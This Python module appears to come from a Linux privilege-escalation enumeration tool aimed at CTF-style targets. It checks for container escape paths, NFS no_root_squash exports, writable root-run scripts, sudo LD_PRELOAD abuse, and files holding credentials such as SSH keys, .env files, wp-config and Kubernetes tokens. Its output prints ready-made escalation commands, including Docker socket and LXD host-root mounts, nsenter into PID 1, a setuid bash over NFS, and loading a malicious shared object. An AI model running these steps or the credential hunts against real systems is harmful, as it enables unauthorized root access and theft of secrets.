"""
Containers, Interesting Files & Misc Checks Module
- Docker / LXD / Kubernetes escape detection
- Interesting files with passwords
- NFS no_root_squash
- Running processes as root
- Writable /etc/ld.so (library hijacking)
- Timers and at jobs
"""

import os
import re
from LD_PRELOAD.utils.output import print_found, print_info, print_warn, print_critical, run_cmd


def check_container_escape() -> dict:
    """Detect if we're inside a container and check escape vectors."""
    results = {"in_container": False, "type": None, "escapes": []}

    # ── Docker detection ──
    in_docker = (
        os.path.exists("/.dockerenv") or
        "docker" in run_cmd("cat /proc/1/cgroup 2>/dev/null") or
        "container" in run_cmd("systemd-detect-virt 2>/dev/null").lower()
    )

    if in_docker:
        results["in_container"] = True
        results["type"] = "Docker"
        print_warn("[CONTAINER] Running inside a Docker container!")

        # Check for privileged mode
        cap_output = run_cmd("cat /proc/self/status 2>/dev/null | grep CapEff")
        if cap_output:
            cap_hex = cap_output.split(":")[-1].strip()
            try:
                # Full capabilities = privileged container
                if int(cap_hex, 16) == 0x3fffffffff:
                    results["escapes"].append("privileged_container")
                    print_critical(
                        "[DOCKER] 🚨 PRIVILEGED container!\n"
                        "          Mount host: mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp\n"
                        "          Or: nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
                    )
            except ValueError:
                pass

        # Check for mounted docker socket
        if os.path.exists("/var/run/docker.sock"):
            results["escapes"].append("docker_socket")
            print_critical(
                "[DOCKER] 🚨 Docker socket mounted: /var/run/docker.sock\n"
                "          Escape: docker run -v /:/host --rm -it alpine chroot /host bash"
            )

        # Check for host filesystem mounts
        mounts = run_cmd("cat /proc/mounts 2>/dev/null")
        for line in mounts.split("\n"):
            if "/host" in line or "hostfs" in line.lower():
                results["escapes"].append("host_mount")
                print_critical(f"[DOCKER] 🚨 Host filesystem mounted: {line.strip()}")

    # ── LXD/LXC detection ──
    lxd_group = run_cmd("id | grep lxd")
    if lxd_group or os.path.exists("/var/lib/lxd"):
        results["type"] = "LXD"
        results["escapes"].append("lxd_group")
        print_critical(
            "[LXD] 🚨 LXD group membership or LXD present!\n"
            "       Escape: lxc init ubuntu:18.04 privesc -c security.privileged=true\n"
            "       Then:   lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n"
            "       Then:   lxc start privesc && lxc exec privesc /bin/sh"
        )

    # ── Kubernetes detection ──
    k8s_env = any(k in os.environ for k in ["KUBERNETES_SERVICE_HOST", "KUBERNETES_PORT"])
    k8s_files = [
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets/kubernetes.io/serviceaccount/token",
    ]
    if k8s_env or any(os.path.exists(f) for f in k8s_files):
        results["type"] = "Kubernetes"
        print_warn("[K8S] Running inside Kubernetes pod!")

        # Check service account token
        for token_path in k8s_files:
            if os.path.exists(token_path):
                token = run_cmd(f"cat {token_path} 2>/dev/null")
                if token:
                    print_critical(
                        f"[K8S] 🚨 Service account token readable: {token_path}\n"
                        f"       Use kubectl with this token to check cluster permissions!"
                    )
                    # Check if kubectl is available
                    kubectl = run_cmd("which kubectl 2>/dev/null")
                    if kubectl:
                        perms = run_cmd(f"kubectl auth can-i --list 2>/dev/null")
                        print_critical(f"[K8S] Permissions:\n{perms[:300]}")

    return results


def check_nfs_exports() -> list:
    """
    Check NFS exports for no_root_squash.
    no_root_squash = files created by remote root stay as root = easy privesc.
    """
    findings = []
    exports = run_cmd("cat /etc/exports 2>/dev/null")
    if not exports or "No such file" in exports:
        return findings

    print_info("[NFS] /etc/exports found:")
    for line in exports.split("\n"):
        line = line.strip()
        if line and not line.startswith("#"):
            if "no_root_squash" in line:
                findings.append(line)
                print_critical(
                    f"[NFS] 🚨 no_root_squash: {line}\n"
                    f"       On attacker: mount -o rw,vers=2 TARGET_IP:/share /tmp/nfs\n"
                    f"       Then: cp /bin/bash /tmp/nfs/bash; chmod +s /tmp/nfs/bash\n"
                    f"       On victim: /tmp/nfs/bash -p"
                )
            else:
                print_found(f"[NFS] Export: {line}")

    return findings


def check_running_processes() -> list:
    """
    Find processes running as root with unusual commands.
    Scripts running as root = potential injection point.
    """
    findings = []
    output = run_cmd("ps aux 2>/dev/null")

    for line in output.split("\n"):
        parts = line.split()
        if len(parts) < 11:
            continue
        user = parts[0]
        cmd  = " ".join(parts[10:])

        if user == "root" and cmd not in ["-", "0:00"]:
            # Flag interesting root processes
            interesting = any(x in cmd for x in [
                ".sh", ".py", ".pl", ".rb", "python", "perl", "ruby",
                "php", "node", "bash", "sh ", "/tmp/", "/var/tmp/",
                "nc ", "netcat", "socat", "ncat"
            ])
            if interesting:
                findings.append({"user": user, "cmd": cmd})
                print_critical(f"[PROC] 🚨 Root running: {cmd[:100]}")
                # Check if script is writable
                script_match = re.search(r'(/[^\s]+\.(sh|py|pl|rb|php))', cmd)
                if script_match:
                    script = script_match.group(1)
                    if os.access(script, os.W_OK):
                        print_critical(f"         🔥 AND the script is WRITABLE: {script}")

    return findings


def find_interesting_files() -> list:
    """Hunt for interesting files that may contain credentials or flags."""
    findings = []

    searches = [
        # Config files with passwords
        ("find /var/www -name '*.php' 2>/dev/null | xargs grep -l 'password\\|passwd\\|db_pass' 2>/dev/null | head -10",
         "PHP files with passwords"),
        ("find /opt /srv /app /home /root -name '*.conf' -o -name '*.config' -o -name '*.cfg' 2>/dev/null | head -20",
         "Config files"),
        ("find / -name '.env' 2>/dev/null | grep -v proc | head -10",
         "envfiles"),
        ("find /home /root /opt -name '*.txt' 2>/dev/null | grep -v proc | head -20",
         "Text files in home/opt"),
        ("find / -name 'flag*' -o -name 'user.txt' -o -name 'root.txt' 2>/dev/null | grep -v proc | head -10",
         "CTF flags"),
        ("find / -name 'id_rsa' -o -name 'id_dsa' 2>/dev/null | grep -v proc | head -10",
         "SSH private keys"),
        ("find /var/log -readable 2>/dev/null | head -10",
         "Readable log files"),
        ("find / -name 'wp-config.php' 2>/dev/null | head -5",
         "WordPress configs"),
        ("find / -name '.bash_history' 2>/dev/null | head -10",
         "Bash history files"),
        ("find / -name 'backup*' -o -name '*.bak' -o -name '*.backup' 2>/dev/null | grep -v proc | head -10",
         "Backup files"),
    ]

    for cmd, label in searches:
        output = run_cmd(cmd)
        if output and "No such file" not in output:
            findings.append({"type": label, "files": output.strip()})
            lines = [l for l in output.strip().split("\n") if l.strip()]
            if lines:
                print_found(f"[FILES] {label}: {len(lines)} found")
                for f in lines[:5]:
                    print(f"         → {f.strip()}")

    return findings


def check_library_hijacking() -> list:
    """Check for LD_PRELOAD abuse and writable library directories."""
    findings = []

    # Check if LD_PRELOAD is set
    ld_preload = os.environ.get("LD_PRELOAD", "")
    if ld_preload:
        findings.append({"type": "ld_preload_set", "value": ld_preload})
        print_critical(f"[LIB] 🚨 LD_PRELOAD is set: {ld_preload}")

    # Check for sudo LD_PRELOAD abuse
    sudo_env = run_cmd("sudo -l 2>/dev/null")
    if "LD_PRELOAD" in sudo_env and "env_keep" in sudo_env:
        print_critical(
            "[LIB] 🚨 sudo preserves LD_PRELOAD!\n"
            "       Create malicious .so: gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles\n"
            "       Then: sudo LD_PRELOAD=/tmp/evil.so some_command"
        )
        findings.append({"type": "sudo_ld_preload"})

    # Writable lib directories
    lib_dirs = ["/lib", "/usr/lib", "/lib64", "/usr/local/lib"]
    for d in lib_dirs:
        if os.access(d, os.W_OK):
            findings.append({"type": "writable_lib_dir", "path": d})
            print_critical(f"[LIB] 🚨 Writable library directory: {d}")

    return findings


def run() -> dict:
    print_info("Checking containers, processes, NFS, and interesting files...")
    return {
        "containers":      check_container_escape(),
        "nfs":             check_nfs_exports(),
        "processes":       check_running_processes(),
        "interesting_files": find_interesting_files(),
        "library_hijack":  check_library_hijacking(),
    }